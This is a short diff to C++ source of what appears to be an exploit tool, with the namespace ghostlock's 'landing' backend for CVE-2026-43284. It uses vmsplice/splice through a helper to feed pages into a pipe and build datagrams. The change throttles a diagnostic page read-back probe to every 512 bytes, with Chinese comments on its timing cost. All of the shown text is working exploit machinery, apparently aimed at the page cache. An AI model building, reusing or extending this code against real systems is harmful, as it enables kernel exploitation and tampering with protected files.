@@ -40,6 +40,10 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         constexpr std::size_t kMinDatagramBytes = kBeforePageBytes + kBlockBytes;
         /** The check is at most a SHA-256 digest; the capacity it is written with. */
         constexpr std::size_t kIcvCapacityBytes = 32U;
+        /** 诊断探针的粒度：与日志的 512 字节一行同一门限。**不是每块**：载体不可直读时，
+         *  每块探一次 = 每块多一次 helper 的 fork+exec（实测 769 块里这第四趟约占 14 s），
+         *  而这条「同一个来源读该处得到什么」的证据只在抽样点上才读得出结论。 */
+        constexpr std::size_t kProbeEveryBytes = 512U;
 
         /** Writes the whole buffer: short transfers are retried, -EINTR is retried unchanged. */
         [[nodiscard]] bool vmsplice_all(const SpliceIoOps &io, int fd,
@@ -260,16 +264,24 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                         cursor - offset, kBlockBytes, static_cast<unsigned long long>(cursor));
             } else {
                 const long spliced = helper_.splice16(helper_.ctx, fds[1], offset);
-                /* 并排事实：helper 送进管道的块数，以及经同一来源读该处会得到的前 4 字节。 */
-                std::uint8_t probe[16] = {};
-                const long probed = old_page_.available()
-                                   ? old_page_.read16(old_page_.ctx, offset, probe)
-                                   : -1;
-                GL_LOGI("helper splice: offset=%llu spliced=%ld probed=%ld head=%02x%02x%02x%02x fd=%d helper_avail=%d",
-                        static_cast<unsigned long long>(offset), spliced, probed,
-                        static_cast<unsigned>(probe[0]), static_cast<unsigned>(probe[1]),
-                        static_cast<unsigned>(probe[2]), static_cast<unsigned>(probe[3]),
-                        file_fd_, helper_.available() ? 1 : 0);
+                /* 并排事实（**抽样块才做**）：helper 送进管道的块数，以及经同一来源读该处会得到的
+                 * 前 4 字节。每块都做等于每块多一次 helper exec —— 那一次读不参与组帧，只供对照，
+                 * 所以它按 512 字节的粒度抽样；管道里的页仍由上面那一次 splice16 放进来的页缓存
+                 * 提供，**页身份不变**（本文件的页来源语义没有动过）。 */
+                if ((offset % kProbeEveryBytes) == 0U) {
+                    std::uint8_t probe[kBlockBytes] = {};
+                    const long probed = old_page_.available()
+                                       ? old_page_.read16(old_page_.ctx, offset, probe)
+                                       : -1;
+                    GL_LOGI("helper splice: offset=%llu spliced=%ld probed=%ld head=%02x%02x%02x%02x fd=%d helper_avail=%d",
+                            static_cast<unsigned long long>(offset), spliced, probed,
+                            static_cast<unsigned>(probe[0]), static_cast<unsigned>(probe[1]),
+                            static_cast<unsigned>(probe[2]), static_cast<unsigned>(probe[3]),
+                            file_fd_, helper_.available() ? 1 : 0);
+                } else {
+                    GL_LOGI("helper splice: offset=%llu spliced=%ld (probe off-cadence)",
+                            static_cast<unsigned long long>(offset), spliced);
+                }
                 if (spliced != static_cast<long>(kBlockBytes)) { last_error_ = 22; break; }
             }
             const std::size_t suffix = size - kMinDatagramBytes;
